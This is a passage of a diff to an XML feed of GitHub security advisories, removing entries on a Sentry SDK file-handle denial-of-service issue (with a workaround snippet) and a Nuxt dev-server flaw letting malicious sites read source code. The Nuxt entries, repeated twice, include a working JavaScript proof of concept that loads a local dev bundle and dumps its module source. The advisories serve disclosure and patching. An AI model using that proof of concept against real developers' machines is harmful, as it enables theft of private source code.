+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8gvc-j273-4wm5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-02-04T16:51:08.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[zx] ZX Allows Environment Variable Injection for dotenv API]]></title>
         <id>https://github.com/advisories/GHSA-qwp8-x4ff-5h87</id>
@@ -714,301 +1050,5 @@ Once upgraded, please make sure the feature flag '@aws-cdk/aws-iam:oidcRejectUna
         </author>
         <category label="severity" term="LOW"/>
         <published>2025-01-28T20:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@sentry/bun] Potential DoS when using ContextLines integration]]></title>
-        <id>https://github.com/advisories/GHSA-r5w7-f542-q2j4</id>
-        <link href="https://github.com/advisories/GHSA-r5w7-f542-q2j4"/>
-        <updated>2025-01-28T21:26:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>
-<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>
-<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration">docs</a> for more details.</p>
-<pre><code class="language-js">Sentry.init({
-  // ...
-  integrations: function (integrations) {
-    // integrations will be all default integrations
-    return integrations.filter(function (integration) {
-      return integration.name !== "ContextLines";
-    });
-  },
-});
-</code></pre>
-<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Reported issue: <a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li>PR Fix: <a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5w7-f542-q2j4">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5w7-f542-q2j4</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-01-28T20:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@sentry/aws-serverless] Potential DoS when using ContextLines integration]]></title>
-        <id>https://github.com/advisories/GHSA-r5w7-f542-q2j4</id>
-        <link href="https://github.com/advisories/GHSA-r5w7-f542-q2j4"/>
-        <updated>2025-01-28T21:26:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>
-<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>
-<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration">docs</a> for more details.</p>
-<pre><code class="language-js">Sentry.init({
-  // ...
-  integrations: function (integrations) {
-    // integrations will be all default integrations
-    return integrations.filter(function (integration) {
-      return integration.name !== "ContextLines";
-    });
-  },
-});
-</code></pre>
-<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Reported issue: <a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li>PR Fix: <a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5w7-f542-q2j4">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5w7-f542-q2j4</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-01-28T20:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@sentry/astro] Potential DoS when using ContextLines integration]]></title>
-        <id>https://github.com/advisories/GHSA-r5w7-f542-q2j4</id>
-        <link href="https://github.com/advisories/GHSA-r5w7-f542-q2j4"/>
-        <updated>2025-01-28T21:26:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>
-<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>
-<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration">docs</a> for more details.</p>
-<pre><code class="language-js">Sentry.init({
-  // ...
-  integrations: function (integrations) {
-    // integrations will be all default integrations
-    return integrations.filter(function (integration) {
-      return integration.name !== "ContextLines";
-    });
-  },
-});
-</code></pre>
-<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Reported issue: <a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li>PR Fix: <a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5w7-f542-q2j4">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5w7-f542-q2j4</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-01-28T20:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@sentry/node] Potential DoS when using ContextLines integration]]></title>
-        <id>https://github.com/advisories/GHSA-r5w7-f542-q2j4</id>
-        <link href="https://github.com/advisories/GHSA-r5w7-f542-q2j4"/>
-        <updated>2025-01-28T21:26:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>
-<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>
-<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href="https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration">docs</a> for more details.</p>
-<pre><code class="language-js">Sentry.init({
-  // ...
-  integrations: function (integrations) {
-    // integrations will be all default integrations
-    return integrations.filter(function (integration) {
-      return integration.name !== "ContextLines";
-    });
-  },
-});
-</code></pre>
-<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Reported issue: <a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li>PR Fix: <a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/issues/14892">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>
-<li><a href="https://github.com/getsentry/sentry-javascript/pull/14997">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5w7-f542-q2j4">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5w7-f542-q2j4</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-01-28T20:37:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@nuxt/rspack-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code]]></title>
-        <id>https://github.com/advisories/GHSA-4gf7-ff8x-hq99</id>
-        <link href="https://github.com/advisories/GHSA-4gf7-ff8x-hq99"/>
-        <updated>2025-01-27T11:31:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.</p>
-<h3 id="details">Details</h3>
-<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src="http://localhost:3000/_nuxt/app.js"&gt;</code> in their site and run the script.
-By using <code>Function::toString</code> against the values in <code>window.webpackChunknuxt_app</code>, the attacker can get the source code.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Create a nuxt project with webpack / rspack builder.</li>
-<li>Run <code>npm run dev</code></li>
-<li>Open <code>http://localhost:3000</code></li>
-<li>Run the script below in a web site that has a different origin.</li>
-<li>You can see the source code output in the document and the devtools console.</li>
-</ol>
-<pre><code class="language-js">const script = document.createElement('script')
-script.src = 'http://localhost:3000/_nuxt/app.js'
-script.addEventListener('load', () =&gt; {
-  for (const page in window.webpackChunknuxt_app) {
-    const moduleList = window.webpackChunknuxt_app[page][1]
-    console.log(moduleList)
-
-    for (const key in moduleList) {
-      const p = document.createElement('p')
-      const title = document.createElement('strong')
-      title.textContent = key
-      const code = document.createElement('code')
-      code.textContent = moduleList[key].toString()
-      p.append(title, ':', document.createElement('br'), code)
-      document.body.appendChild(p)
-    }
-  }
-})
-document.head.appendChild(script)
-</code></pre>
-<p><img alt="image" src="https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85">
-It contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the <code>sourcesContent</code> field).</p>
-<h3 id="impact">Impact</h3>
-<p>Users using webpack / rspack builder may get the source code stolen by malicious websites.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24361">https://nvd.nist.gov/vuln/detail/CVE-2025-24361</a></li>
-<li><a href="https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>
-<li><a href="https://github.com/advisories/GHSA-4gf7-ff8x-hq99">https://github.com/advisories/GHSA-4gf7-ff8x-hq99</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4gf7-ff8x-hq99</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-01-27T11:31:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@nuxt/webpack-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code]]></title>
-        <id>https://github.com/advisories/GHSA-4gf7-ff8x-hq99</id>
-        <link href="https://github.com/advisories/GHSA-4gf7-ff8x-hq99"/>
-        <updated>2025-01-27T11:31:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.</p>
-<h3 id="details">Details</h3>
-<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src="http://localhost:3000/_nuxt/app.js"&gt;</code> in their site and run the script.
-By using <code>Function::toString</code> against the values in <code>window.webpackChunknuxt_app</code>, the attacker can get the source code.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Create a nuxt project with webpack / rspack builder.</li>
-<li>Run <code>npm run dev</code></li>
-<li>Open <code>http://localhost:3000</code></li>
-<li>Run the script below in a web site that has a different origin.</li>
-<li>You can see the source code output in the document and the devtools console.</li>
-</ol>
-<pre><code class="language-js">const script = document.createElement('script')
-script.src = 'http://localhost:3000/_nuxt/app.js'
-script.addEventListener('load', () =&gt; {
-  for (const page in window.webpackChunknuxt_app) {
-    const moduleList = window.webpackChunknuxt_app[page][1]
-    console.log(moduleList)
-
-    for (const key in moduleList) {
-      const p = document.createElement('p')
-      const title = document.createElement('strong')
-      title.textContent = key
-      const code = document.createElement('code')
-      code.textContent = moduleList[key].toString()
-      p.append(title, ':', document.createElement('br'), code)
-      document.body.appendChild(p)
-    }
-  }
-})
-document.head.appendChild(script)
-</code></pre>
-<p><img alt="image" src="https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85">
-It contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the <code>sourcesContent</code> field).</p>
-<h3 id="impact">Impact</h3>
-<p>Users using webpack / rspack builder may get the source code stolen by malicious websites.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24361">https://nvd.nist.gov/vuln/detail/CVE-2025-24361</a></li>
-<li><a href="https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>
-<li><a href="https://github.com/advisories/GHSA-4gf7-ff8x-hq99">https://github.com/advisories/GHSA-4gf7-ff8x-hq99</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4gf7-ff8x-hq99</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-01-27T11:31:41.000Z</published>
     </entry>
 </feed>
